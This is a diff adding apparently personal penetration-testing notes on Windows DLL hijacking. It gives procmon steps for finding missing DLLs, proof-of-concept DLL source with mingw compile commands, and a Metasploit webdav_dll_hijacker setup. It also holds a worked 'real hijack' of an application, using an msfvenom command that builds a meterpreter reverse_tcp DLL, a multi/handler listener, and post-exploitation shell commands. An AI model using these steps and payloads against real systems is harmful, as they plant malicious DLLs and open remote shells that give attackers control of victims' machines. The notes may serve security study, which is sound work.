@@ -1,0 +1,186 @@
+When an application uses a DLL it must locate it via a search:
+
+DLL Search Order
+	1. Directory from which the application loaded
+	2. Current Directory
+	3. System directory. Use the GetSystemDirectory function to get the path of this directory
+	4. The 16-bit system directory
+	5. Window directory. Use the GetWindowsDirectory function to get the path of this directory
+	6. Directories listed in the PATH environment variable
+
+If SafeDLLSearchMode is enabled, the search order changes to the following:
+	1. Directory from which the application loaded
+	2. System directory. Use the GetSystemDirectory function to get the path of this directory
+	3. The 16-bit system directory
+	4. Window directory. Use the GetWindowsDirectory function to get the path of this directory
+	5. Current Directory
+	6. Directories listed in the PATH environment variable
+
+The idea here is that we create a malicious DLL an put it higher in the search order so it gets 
+loaded before the actual one does
+
+
+Use sys internals "procmon" to monitor 
+Run victim program
+in procmon:
+	Filter Menu -> Filter
+		Display entries matching these conditions (change from Architecture):
+			Process Name is <name of exe you ran>
+			add
+
+			Path contains ".dll"
+			add
+		Apply
+
+	Look for DLLs that have a result of "Name Not Found". These are DLL that could be highjacked.
+	Filter Menu -> Filter
+		Display entries matching these conditions (change from Architecture):
+			Result contains "name not found"
+			add
+		Apply
+
+			Path contains <name of folder>
+			result is name not found
+			
+***************************************************************************
+Simple proof-of-concept DLL source code (compile on Kali):
+--------------
+#Run Calculator
+#include <windows.h>
+#define DLLIMPORT __declspec (dllexport)
+
+DLLIMPORT void hook_startup() { evil(); }
+
+int evil()
+{
+  WinExec("calc", 0);
+  exit(0);
+  return 0;
+}
+
+
+------------
+#Message Pop-UP
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		dll_mll();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+int dll_mll()
+{
+	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
+}
+
+----------------
+
+Save above source code to hijack.c
+		
+complie on kali linux:
+	i686-w64-mingw32-gcc ./hijack.c -o hijack.dll -shared
+
+Confirm the message box runs on windows by running:
+	c:\windows\SysWOW64\rundll32.exe hijack.dll MsgBox	#for 32 bit platforms
+	c:\windows\system32\rundll32.exe hijack.dll MsgBox	#for 64 bit platforms
+	for some reason the Calc won't work.
+
+Rename hijack.dll to the name of the dll you want to highjack
+copy the new dll to the path where it was being looked for in procmon
+
+rerun the program
+
+Message Box should launch
+
+***************************************************************************
+Dynamic Duo of DLL Loading:
+
+	LoadLibrary
+
+	GetProcAddress
+
+
+http://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2
+
+https://github.com/rsmudge/metasploit-loader
+
+
+Open exe in PEBrowse64 -> Sections ->
+	Expand "Sections"
+		do you see UPX0, UPX1, etc?
+			This means a packer has been used.
+			
+Install UPX (Ultimate Packer for eXecutables)
+	https://upx.github.io
+
+	
+upx -d file.exe
+	-d 	decompress a packed file
+
+	        	File size      Ratio      Format      Name
+   		--------------------   ------   -----------   -----------
+    		710960 <-    327472   46.06%    win32/pe     file.exe
+
+
+
+
+
+In Metasploit
+	search dll_hijacker
+
+	use exploit/windows/browser/webdav_dll_hijacker
+	set BASENAME "rockmusic"		#name of file
+	set EXTENSIONS "mp3"			#file extension
+	set SHARENAME "FreeMusic"		#Windows Share Name
+	exploit
+
+
+***************************************************************************
+Actual real hijack of the XXXX application 
+
+In procmon:
+	Filter Menu -> Filter
+		Process Name 	is		application.exe
+		Path 		contains	.dll
+		Result		contains	name not found
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.184 LPORT=4444 -a x64 -f dll > CRYPTSP.dll
+	CRYPTSP.dll 		-> was discovered from procmon
+	LHOST 			-> is the ip of the metasploit listener
+	LPORT			-> TCP port to listen on
+	-f dll			-> File creation type
+	-a x64			-> 64 bit dll creation
+
+Copied CRYPTSP.dll to C:\AppFolder\
+
+Create listener in metastploit
+	use exploit/multi/handler
+	set payload windows/x64/meterpreter/reverse_tcp
+	set LHOST 192.168.1.184
+	set LPORT 4444
+	exploit
+
+
+Run the application
+
+Reverse shell should be created. Run the following in the shell:
+	sysinfo
+	getuid
+	execute -f cmd.exe -H -c -i
+
+***************************************************************************
+
+DLL Proxying:
+https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence
+https://github.com/tothi/dll-hijack-by-proxying
+
+
+***************************************************************************
